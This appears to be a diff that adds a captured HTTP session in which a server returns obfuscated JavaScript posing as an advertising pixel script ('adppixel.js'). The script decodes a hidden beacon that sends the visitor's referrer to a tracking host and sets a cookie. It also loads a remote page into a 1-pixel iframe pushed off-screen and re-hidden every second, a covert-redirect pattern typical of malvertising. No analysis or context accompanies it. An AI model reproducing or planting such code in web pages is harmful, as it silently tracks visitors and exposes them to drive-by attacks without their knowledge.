@@ -1,0 +1,248 @@
+PHTTP69.175.85.106"®
+,GET /stats/publishers/adppixel.js HTTP/1.1
+Host: tracksitetraffic1.com
+Connection: keep-alive
+Accept: */*
+vUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
+qReferer: http://n5.adshostnet.com/ads?v=1&key=5c82c4c7eba89840f0669a6e8671813d&ch=&click=&tz=-5&t=1389231355068
+$Accept-Encoding: gzip,deflate,sdch
+!Accept-Language: en-US,en;q=0.8
+
+*¯
+HTTP/1.1 200 OK
+Server: nginx/1.4.2
+%Date: Wed, 08 Jan 2014 20:52:24 GMT
+7Content-Type: application/x-javascript; charset=utf-8
+Content-Length: 3138
+.Last-Modified: Mon, 16 Dec 2013 18:10:47 GMT
+Connection: keep-alive
+ETag: "52af4227-c42"
+(Expires: Fri, 07 Feb 2014 20:52:24 GMT
+ Cache-Control: max-age=2592000
+Accept-Ranges: bytes
+Ä
+  var keyStr = "ABCDEFGHIJKLMNOP" +
+
+                "QRSTUVWXYZabcdef" +
+
+                "ghijklmnopqrstuv" +
+
+                "wxyz0123456789+/" +
+
+                "=";
+
+ 
+
+   function uJxO() {
+
+   
+
+      var output = "";
+
+      var chr1, chr2, chr3 = "";
+
+      var enc1, enc2, enc3, enc4 = "";
+
+      var i = 0;
+
+  	  var input='PGltZyBzcmM9Imh0dHA6Ly90cmFja3NpdGV0cmFmZmljMS5jb20vc3RhdHMvaGl0LnBocD9uYW1lPWFkcHBpeGVsX2ZpbHRlciZSZWZlcmVyPQ==';
+
+      // remove all characters that are not A-Z, a-z, 0-9, +, /, or =
+
+      var base64test = /[^A-Za-z0-9\+\/\=]/g;
+
+      if (base64test.exec(input)) {
+
+ 
+
+      }
+
+      input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+
+  
+
+      do {
+
+         enc1 = keyStr.indexOf(input.charAt(i++));
+
+         enc2 = keyStr.indexOf(input.charAt(i++));
+
+         enc3 = keyStr.indexOf(input.charAt(i++));
+
+         enc4 = keyStr.indexOf(input.charAt(i++));
+
+  
+
+         chr1 = (enc1 << 2) | (enc2 >> 4);
+
+         chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+
+         chr3 = ((enc3 & 3) << 6) | enc4;
+
+  
+
+         output = output + String.fromCharCode(chr1);
+
+  
+
+         if (enc3 != 64) {
+
+            output = output + String.fromCharCode(chr2);
+
+         }
+
+         if (enc4 != 64) {
+
+            output = output + String.fromCharCode(chr3);
+
+         }
+
+  
+
+         chr1 = chr2 = chr3 = "";
+
+         enc1 = enc2 = enc3 = enc4 = "";
+
+  
+
+      } while (i < input.length);
+
+   
+
+      return  output ;
+
+     
+
+   }
+
+  
+
+  
+
+ 
+
+
+
+function krls(){
+
+	 var expiredays=1;
+
+	 var c_name="F0aC5";
+
+	 var value='A&HaJSUYFVSn';
+
+	 var exdate=new Date();
+
+	 exdate.setTime(exdate.getTime()+86400000);
+
+	 document.cookie=c_name+ "=" +escape(value)+((expiredays===null) ? "" : ";expires="+exdate.toGMTString());
+
+	 } 
+
+
+
+function HczJ()
+
+{
+
+var c_name="F0aC5";
+
+if (document.cookie.length>0)
+
+  {
+
+  c_start=document.cookie.indexOf(c_name + "=");
+
+  if (c_start!=-1)
+
+    {
+
+    c_start=c_start + c_name.length+1;
+
+    c_end=document.cookie.indexOf(";",c_start);
+
+    if (c_end==-1)  {
+
+     c_end=document.cookie.length;
+
+     }
+
+    return  document.cookie.substring(c_start,c_end) ;
+
+    }
+
+  }
+
+return "";
+
+} 
+
+ 
+
+function doTheIframe() {
+
+divb=document.createElement("div");
+
+divb.setAttribute("id", "bointsoftimg");
+
+ifrm = document.getElementById("iframebojan");
+
+
+ifrm.setAttribute("src", "http://www.visit-tracker.com/adpixel.htm");
+
+ifrm.style.width = "1px";
+
+ifrm.style.height = "1px";
+
+ifrm.style.display="inline";
+ifrm.style.position="absolute";
+ifrm.style.left="-1000px";
+ifrm.style.top="-1000px";
+divb.style.display="none";
+
+ 
+
+document.body.appendChild(divb);
+
+}
+
+function hideity(){
+
+ifrm = document.getElementById("iframebojan");
+ 
+ifrm.style.display="inline";
+ifrm.style.position="absolute";
+ifrm.style.left="-1000px";
+ ifrm.style.left="-1000px";
+return 0;
+
+}
+
+window.setInterval( "hideity()",1000);
+ 
+
+function JdSm() { 
+
+ 
+
+var mm = uJxO();
+
+var pred=mm;
+
+pred=pred +  document.referrer ;pred=pred + '" border="0" alt="" />';
+
+document.getElementById('bointsoftimg').innerHTML = pred;
+
+krls();
+
+
+
+}
+
+window.onload=function() {
+
+doTheIframe();
+
+};
+
+window.setTimeout( "JdSm()" ,5000);
